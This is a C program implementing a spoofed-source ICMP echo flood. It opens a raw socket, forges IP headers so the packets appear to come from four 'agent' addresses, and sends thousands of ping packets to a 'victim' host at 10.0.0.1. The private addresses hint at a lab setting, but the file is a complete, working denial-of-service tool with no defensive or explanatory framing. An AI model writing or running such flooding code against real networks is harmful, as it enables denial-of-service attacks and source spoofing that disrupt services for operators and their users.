#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <time.h>

// Standard Checksum Calculation
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;

    if (len == 1)
        sum += *(unsigned char*)buf;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;

    return result;
}

int main() {
    int sockfd;
    
    char *agents[] = {
        "10.0.0.3", 
        "10.0.0.4", 
        "10.0.0.5", 
        "10.0.0.6"
    }; 
    
    char victim[] = "10.0.0.1"; // The target
    int rounds = 1000;          // Number of packets to send (Flood)
    
    int num_agents = sizeof(agents) / sizeof(agents[0]);
    printf("Starting ICMP Flood...\n");
    printf("Target: %s\n", victim);
    printf("Spoofed Agents: %d\n", num_agents);
    
    struct sockaddr_in dest_addr;
    char *packet;
    int psize = 64; // Standard ping payload size

    // 1. Create Raw Socket
    // AF_INET: IPv4
    // SOCK_RAW: Raw Socket
    // IPPROTO_RAW: We will provide the IP Header
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    
    if (sockfd < 0) {
        perror("Socket creation failed (Are you running with sudo?)");
        exit(1);
    }
    
    // 2. Set IP_HDRINCL (Header Include)
    // This tells the kernel: "Don't add an IP header, I have already included it in the packet buffer"
    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt error");
        return 1;
    }

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(victim);

    // 3. Attack Loop
    for(int r = 0; r < rounds; r++) {
        for(int i = 0; i < num_agents; i++) {
            
            // Allocate memory: IP Header + ICMP Header + Payload
            int packet_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + psize;
            packet = malloc(packet_len);
            if (!packet) { perror("Memory allocation failed"); exit(1); }
            
            memset(packet, 0, packet_len);

            // Pointers to locations in the packet buffer
            struct iphdr *iph = (struct iphdr *) packet;
            struct icmphdr *icmph = (struct icmphdr *) (packet + sizeof(struct iphdr));
            char *data = (char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));

            // Fill Payload (Optional, but makes it look like a real ping)
            memset(data, 'A', psize);

            // --- FILL IP HEADER ---
            iph->ihl = 5;                   // Header length
            iph->version = 4;               // IPv4
            iph->tos = 0;                   // Type of Service
            iph->tot_len = packet_len;      // Total length
            iph->id = htons(rand() % 65535);// ID
            iph->frag_off = 0;              // No fragmentation
            iph->ttl = 255;                 // Time to live
            iph->protocol = IPPROTO_ICMP;   // Upper layer protocol
            iph->check = 0;                 // Initial checksum
            iph->saddr = inet_addr(agents[i]); // SPOOFED SOURCE IP
            iph->daddr = dest_addr.sin_addr.s_addr; // DESTINATION IP
            
            // Calculate IP Checksum
            iph->check = checksum((unsigned short *) packet, sizeof(struct iphdr));

            // --- FILL ICMP HEADER ---
            icmph->type = ICMP_ECHO;        // Type 8 (Request)
            icmph->code = 0;                // Code 0
            icmph->un.echo.id = htons(1234);
            icmph->un.echo.sequence = htons(r);
            icmph->checksum = 0;
            
            // Calculate ICMP Checksum (Header + Data)
            icmph->checksum = checksum((unsigned short *) icmph, sizeof(struct icmphdr) + psize);

            // 4. Send Packet
            if (sendto(sockfd, packet, packet_len, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0) {
                perror("Send failed");
            } else {
                // printf("Sent spoofed packet from %s\n", agents[i]); // Uncomment to see individual sends
            }

            free(packet);
        }
    }
    
    printf("Attack finished. Sent %d packets.\n", rounds * num_agents);
    close(sockfd);
    return 0;
}
